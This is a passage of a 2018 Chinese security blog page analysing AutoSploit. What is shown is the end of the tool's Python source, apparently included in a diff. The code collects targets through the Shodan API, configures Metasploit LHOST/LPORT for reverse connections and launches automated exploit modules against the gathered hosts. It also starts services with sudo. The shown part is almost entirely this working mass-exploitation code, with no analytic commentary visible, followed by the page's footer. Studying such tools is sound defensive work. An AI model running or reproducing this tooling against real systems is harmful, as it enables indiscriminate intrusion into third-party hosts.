class="line">    print &quot;settings need to be configured.&quot;</span><br><span class="line">    time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Note.\n&quot;</span><br><span class="line">    print &quot;Please make sure your Network is configured properly.\n&quot;</span><br><span class="line">    print &quot;In order to handle incoming Reverse Connections&quot;</span><br><span class="line">    print &quot;your external Facing IP &amp; Port need to be reachable...&quot;</span><br><span class="line">    time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    workspace = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the Workspace name: &quot;)</span><br><span class="line">    if not workspace == &quot;&quot;:</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Workspace set to: &quot; + workspace</span><br><span class="line">    else:</span><br><span class="line">        workspace = False</span><br><span class="line"></span><br><span class="line">    local_host = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the local host: &quot;)</span><br><span class="line">    if not local_host == &quot;&quot;:</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Local host set to: &quot; + repr(local_host)</span><br><span class="line">    else:</span><br><span class="line">        local_host = False</span><br><span class="line"></span><br><span class="line">    local_port = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Please set the local port: &quot;)</span><br><span class="line">    if not local_host == &quot;&quot;:</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Local port set to: &quot; + repr(local_port)</span><br><span class="line">    else:</span><br><span class="line">        local_port = False</span><br><span class="line"></span><br><span class="line">    # Check if settings are not null</span><br><span class="line">    if workspace == False or local_host == False or local_port == False:</span><br><span class="line">        configured = None</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. LPORT, LHOST and/or workspace cannot be null&quot;</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Restarting MSF Settings module.&quot;</span><br><span class="line">        time.sleep(1.5)</span><br><span class="line">    else:</span><br><span class="line">        # If everything has been properly configured we&#x27;re setting config var to true</span><br><span class="line">        # When we return to the main menu loop we will use it to check to see if we</span><br><span class="line">        # can skip the config stage. When the exploit component is run a second time</span><br><span class="line">        configured = True</span><br><span class="line"></span><br><span class="line">        if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;</span><br><span class="line">            print &quot;In order for the exploit module to work, a host file needs to be&quot;</span><br><span class="line">            print &quot;present.&quot;</span><br><span class="line">        else:</span><br><span class="line">            # Call exploit function, the &#x27;query&#x27; argument contains the search strig provided</span><br><span class="line">            # in the &#x27;gather hosts&#x27; function. We will check this string against the MSF</span><br><span class="line">            # modules in order to sort out the most relevant ones with regards to the intended</span><br><span class="line">            # targets.</span><br><span class="line">            exploit(query)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Main menu</span><br><span class="line">def main():</span><br><span class="line">    global query</span><br><span class="line">    global configured</span><br><span class="line">    global api</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        api = shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. API setup failed.\n&quot;</span><br><span class="line">        print e</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            # Make sure a misconfiguration in the MSF settings</span><br><span class="line">            # Doesn&#x27;t execute main menu loop but returns us to the</span><br><span class="line">            # appropriate function for handling those settings</span><br><span class="line">            if configured == None:</span><br><span class="line">                settings()</span><br><span class="line"></span><br><span class="line">            print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Welcome to AutoSploit. Please select an action.&quot;</span><br><span class="line">            print &quot;&quot;&quot;</span><br><span class="line">		</span><br><span class="line">1. Usage		3. View Hosts		5. Quit</span><br><span class="line">2. Gather Hosts		4. Exploit 					</span><br><span class="line">									&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">            action = raw_input(&quot;\n&lt;&quot; + t.cyan(&quot;AUTOSPLOIT&quot;) + &quot;&gt;$ &quot;)</span><br><span class="line"></span><br><span class="line">            if action == &#x27;1&#x27;:</span><br><span class="line">                usage()</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;2&#x27;:</span><br><span class="line">                if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">                    targets(True)</span><br><span class="line">                else:</span><br><span class="line">                    append = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Append hosts to file or overwrite? [A/O]: &quot;).lower()</span><br><span class="line"></span><br><span class="line">                    if append == &#x27;a&#x27;:</span><br><span class="line">                        targets(False)</span><br><span class="line">                    elif append == &#x27;o&#x27;:</span><br><span class="line">                        targets(True)</span><br><span class="line">                    else:</span><br><span class="line">                        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option.&quot;</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;3&#x27;:</span><br><span class="line">                if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">                    print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;</span><br><span class="line"></span><br><span class="line">                else:</span><br><span class="line">                    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Printing hosts...\n\n&quot;</span><br><span class="line">                    time.sleep(2)</span><br><span class="line"></span><br><span class="line">                    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as infile:</span><br><span class="line">                        for line in infile:</span><br><span class="line">                            print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line</span><br><span class="line"></span><br><span class="line">                    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Done.\n&quot;</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;4&#x27;:</span><br><span class="line">                if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">                    print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;</span><br><span class="line">                    print &quot;Please make sure to gather a list of targets&quot;</span><br><span class="line">                    print &quot;by selecting the &#x27;Gather Hosts&#x27; option&quot;</span><br><span class="line">                    print &quot;before executing the &#x27;Exploit&#x27; module.&quot;</span><br><span class="line"></span><br><span class="line">                if configured == True:</span><br><span class="line">                    exploit(query)</span><br><span class="line">                elif configured == False:</span><br><span class="line">                    settings()</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;5&#x27;:</span><br><span class="line">                print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Exiting AutoSploit...&quot;</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option.&quot;</span><br><span class="line"></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. User aborted.&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Initializing AutoSploit...&quot;</span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]One moment please while we check the Postgresql and Apache services...\n&quot;</span><br><span class="line"></span><br><span class="line">    postgresql = cmdline(&quot;sudo service postgresql status | grep active&quot;)</span><br><span class="line">    if &quot;Active: inactive&quot; in postgresql:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. Heuristics indicate Postgresql Service is offline&quot;</span><br><span class="line"></span><br><span class="line">        start_pst = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Start Postgresql Service? [Y]es/[N]o: &quot;).lower()</span><br><span class="line">        if start_pst == &#x27;y&#x27;:</span><br><span class="line">            os.system(&quot;sudo service postgresql start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Postgresql Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">        elif start_pst == &#x27;n&#x27;:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]AutoSploit&#x27;s MSF related operations require this service to be active.&quot;</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Aborted.&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        else:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to starting the service.&quot;</span><br><span class="line">            os.system(&quot;sudo service postgresql start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Postgresql Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    apache = cmdline(&quot;service apache2 status | grep active&quot;)</span><br><span class="line">    if &quot;Active: inactive&quot; in apache:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. Heuristics indicate Apache Service is offline&quot;</span><br><span class="line"></span><br><span class="line">        start_ap = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Start Apache Service? [Y]es/[N]o: &quot;).lower()</span><br><span class="line">        if start_ap == &#x27;y&#x27;:</span><br><span class="line">            os.system(&quot;sudo service apache2 start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Apache2 Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">        elif start_ap == &#x27;n&#x27;:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]AutoSploit&#x27;s MSF related operations require this service to be active.&quot;</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Aborted.&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        else:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to starting the service.&quot;</span><br><span class="line">            os.system(&quot;sudo service apache2 start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Apache2 Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    # We will check if the shodan api key has been saved before, if not we are going to prompt</span><br><span class="line">    # for it and save it to a file</span><br><span class="line">    if not os.path.isfile(&quot;api.p&quot;):</span><br><span class="line">        print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your Shodan.io API key.&quot;</span><br><span class="line"></span><br><span class="line">        SHODAN_API_KEY = raw_input(&quot;API key: &quot;)</span><br><span class="line">        pickle.dump(SHODAN_API_KEY, open(&quot;api.p&quot;, &quot;wb&quot;))</span><br><span class="line"></span><br><span class="line">        path = os.path.abspath(&quot;api.p&quot;)</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]\nYour API key has been saved to &quot; + path</span><br><span class="line"></span><br><span class="line">        main()</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            SHODAN_API_KEY = pickle.load(open(&quot;api.p&quot;, &quot;rb&quot;))</span><br><span class="line">        except IOError as e:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An IO error was raised while attempting to read API data.&quot;</span><br><span class="line">            print e</span><br><span class="line"></span><br><span class="line">        path = os.path.abspath(&quot;api.p&quot;)</span><br><span class="line">        print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Your API key was loaded from &quot; + path</span><br><span class="line"></span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：AutoSploit的简单分析</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2018-01-20 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/AutoSploit的简单分析/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/JavaScript%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">JavaScript源码分析漏洞挖掘</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/FastJson%20Unserialization/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">FastJson Unserialization</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
